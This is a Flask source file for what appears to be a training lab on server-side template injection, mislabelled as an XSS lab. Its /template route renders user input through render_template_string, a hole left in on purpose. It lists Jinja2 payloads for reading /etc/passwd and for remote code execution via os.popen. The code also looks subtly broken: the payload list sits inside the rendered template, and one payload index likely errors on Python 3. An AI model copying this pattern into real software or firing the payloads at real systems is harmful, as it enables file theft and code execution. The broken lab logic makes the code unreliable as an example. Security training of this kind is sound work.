"""
XSS Lab 18: Template Injection - Similar to XSS
Difficulty: 3 (Advanced)
Type: Server-side Template Injection (SSTI)
Points: 100

Description:
Server-side template vulnerability that can lead to XSS or RCE.
User input processed by template engine without sanitization.
"""

from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <html>
        <head>
            <title>XSS Lab 18: Template Injection</title>
            <style>
                body { font-family: Arial; margin: 40px; }
                input { padding: 8px; width: 300px; }
                button { padding: 8px 15px; background: #007bff; color: white; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>Lab 18: Template Injection</h1>
            <p>This application uses Jinja2 templates with unsanitized user input.</p>
            
            <form action="/template" method="GET">
                <input type="text" name="name" placeholder="Enter your name">
                <button type="submit">Generate</button>
            </form>
            
            <p><strong>Flag:</strong> FLAG{xss_template_injection_018}</p>
        </body>
    </html>
    """

@app.route('/template', methods=['GET'])
def template():
    name = request.args.get('name', 'User')
    
    # VULNERABLE: User input directly in template
    template_string = f"""
    <html>
        <head><title>Greeting</title></head>
        <body>
            <h1>Hello, {{{{ {name} }}}}</h1>
            <p>Welcome to our site.</p>
            
            <h3>SSTI Payloads:</h3>
            <ul>
                <li><code>{{{{ 7*7 }}}}</code> - Test basic SSTI</li>
                <li><code>{{{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}}}</code> - Read files</li>
                <li><code>{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}}}</code> - RCE</li>
            </ul>
        </body>
    </html>
    """
    
    try:
        # VULNERABLE: render_template_string with user input
        return render_template_string(template_string)
    except Exception as e:
        return f"""
        <html>
            <head><title>Error</title></head>
            <body>
                <h1>Error</h1>
                <p>Template Error: {str(e)}</p>
                <p><a href="/">Back</a></p>
            </body>
        </html>
        """

if __name__ == '__main__':
    app.run(debug=True, port=5018)
